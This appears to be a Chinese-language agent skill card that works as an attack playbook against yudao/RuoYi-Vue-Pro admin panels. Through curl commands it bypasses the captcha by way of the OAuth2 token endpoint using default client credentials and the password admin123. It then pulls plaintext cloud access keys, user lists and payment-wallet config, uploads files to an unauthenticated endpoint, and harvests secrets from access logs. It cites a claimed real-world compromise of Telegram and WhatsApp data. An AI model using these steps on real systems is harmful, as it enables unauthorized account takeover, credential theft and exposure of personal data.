---
name: yudao-oauth-token-captcha-bypass
description: >-
  Use when 目标是芋道/yudao(RuoYi-Vue-Pro) admin：登录口挂了 AJ-Captcha 但 /admin-api/system/oauth2/token
  不校验验证码，配 default/admin123 默认客户端 + 弱口令直接拿 super_admin；再用 infra/file-config
  读明文 COS/AK，未授权 upload 落桶。含 tenant-id、X-Api-Encrypt 假加密、日志里 client_secret。
---

# 芋道（yudao）OAuth2 密码授权：绕验证码 + 默认凭据 → 管理员接管

实战来源：GeekTG/GeekIWS 云控（2026-08），测试环境完全接管：19,197 个 TG 号 / 26,840 会话目录 / 37GB WhatsApp 媒体。

## When to Use

- 前端是 **芋道 yudao / RuoYi-Vue-Pro**（`/admin-api/` 前缀、`tenant-id` 头、`code/message/data` 响应体）
- 登录页有 **AJ-Captcha 滑块/点选**，爆破或脚本登录被挡
- 站点开了 **API 加密**（`X-Api-Encrypt` 头、请求体看起来是密文）

## 1. 验证码只挡了 `/system/auth/login`

```bash
# 先确认两个端点都在
curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://目标/admin-api/system/auth/login'
curl -s -o /dev/null -w '%{http_code}\n' -X POST 'https://目标/admin-api/system/oauth2/token'
```

**打 token 端点**（表单，不是 JSON）：

```bash
curl -s -X POST 'https://目标/admin-api/system/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'tenant-id: 1' \
  -d 'grant_type=password&client_id=default&client_secret=admin123&username=admin&password=admin123'
```

- 成功返回 `{"code":0,"data":{"access_token":"...","refresh_token":"...","expires_in":1800}}`
- 芋道默认 `client_id=default` / `client_secret=admin123`（`yudao.security` 配置），多数部署不改
- **验证码只在 `login` 端点校验，`oauth2/token` 走 Spring Security 密码模式，不查 captcha**

## 2. X-Api-Encrypt 只是前端混淆

- 前端把请求体 AES 加密再发，**服务端接受明文**（拦截器只做解密兼容，不做强制）
- 直接用明文 JSON/表单打即可，不用逆向它的 AES 协议
- 判据：把密文请求替换成明文，仍返回正常业务响应

## 3. 拿到 token 后三件事

```bash
T=<access_token>; H=(-H "Authorization: Bearer $T" -H 'tenant-id: 1')
# ① 当前身份与权限
curl -s "${H[@]}" 'https://目标/admin-api/system/auth/get-permission-info'
# ② 文件存储配置（明文 AK）
curl -s "${H[@]}" 'https://目标/admin-api/infra/file-config/get?id=1'
curl -s "${H[@]}" 'https://目标/admin-api/infra/file-config/page?pageNo=1&pageSize=50'
# ③ 用户/租户/密钥类配置
curl -s "${H[@]}" 'https://目标/admin-api/system/user/page?pageNo=1&pageSize=10'
curl -s "${H[@]}" 'https://目标/admin-api/infra/config/page?pageNo=1&pageSize=100'
```

- `file-config` 返回 `accessKey` / `accessSecret` / `bucket` / `endpoint` —— 云厂商账户级密钥（实测可 `ListAllMyBuckets`）
- `infra/config` 里常躺 TronGrid Key、收款钱包地址、初始密码、短信/邮件通道密钥

## 4. 未授权文件上传（另一条独立面）

```bash
curl -s -X POST 'https://目标/app-api/infra/file/upload?directory=zz_probe' \
  -F 'file=@probe.txt'
```

- 多数部署该端点**完全免鉴权**、扩展名不校验、目录可控
- 落桶后若桶是公读或虚拟主机风格 URL → 直接外链；否则作存储滥用/成本消耗

## 5. 日志里的第二波凭据

- `/admin-api/infra/api-access-log`（或 `infra/logger`）里有 **完整请求体**：`client_secret`、座席密钥、`refresh_token`
- 一条日志接口往往顶一次爆破：直接翻页拉，正则提 `secret|token|password`

## 判据门槛

- **L1**：`/admin-api/system/oauth2/token` 存在且返回 `code!=0` 的认证错误（不是 404/验证码错误）
- **L2**：`code:0` 拿到 `access_token`，`get-permission-info` 显示 `super_admin`
- **L3**：`file-config` 拿到云密钥并验证可列举桶 / 拉到 PII

## 坑

1. `tenant-id` 必填，常见 1；不确定就遍历 1-10，错租户返回「租户不存在」
2. 有的部署改了 `client_secret` → 先翻前端 JS/`app.config.js`，常硬编码
3. 密码错误次数锁定按**用户名+租户**计数，别用 admin 硬撞，改用普通账号先验 token 流程
4. `file-config/get?id=` 的 id 需要枚举（1-30），主存储不在 id=1
5. 改密/改配置后 **refresh_token 仍有效**，处置要同时吊销 token 表

## 相关卡

- `cn-admin-framework-pentest` — 国产后台框架总表（若依/芋道/GVA/FastAdmin）
- `ruoyi-vue-plus-admin-fullchain` — 若依系后台下潜链
- `log-endpoint-secret-harvest` — 日志接口提凭据
